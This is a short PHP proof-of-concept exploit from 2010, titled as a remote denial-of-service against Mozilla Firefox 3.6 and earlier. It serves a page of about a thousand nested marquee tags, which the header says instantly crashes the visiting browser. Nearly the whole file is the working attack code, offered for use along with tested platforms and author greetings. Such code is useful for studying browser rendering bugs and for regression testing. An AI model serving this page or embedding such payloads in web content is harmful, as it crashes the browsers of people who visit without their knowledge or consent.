<?php

/*
*    Title: Mozilla Firefox <=3.6 - Remote Denial Of Service Exploit
*    Date: 25/02/10
*    Author: Ale46 - ale46[at]paranoici[dot]org
*    Software Link: http://www.mozilla-europe.org/en/firefox/
*    Version: 3.6 and 3.5.8 are vulnerable so I think that all versions <= 3.6 have the same issue
*    Tested on: Windows 7 x32\x64 - Ubuntu 9.10 x32
*    Description: visiting this php page you'll get an instant crash of Firefox
*    Greetz: Gandalf
*    Extra Greetz: University of Palermo and its fantastics rules for the Computer Engineering degree (how beautiful 's irony)
*/

$a = '<marquee>';
$b = '</marquee>';

for ($i=0;$i<=1000;$i++){
    $a .= '<marquee>';
    $b .= '</marquee>';
}

echo '<body>';
echo $a;
echo "hadouken!";
echo $b;
echo '</body>';

?>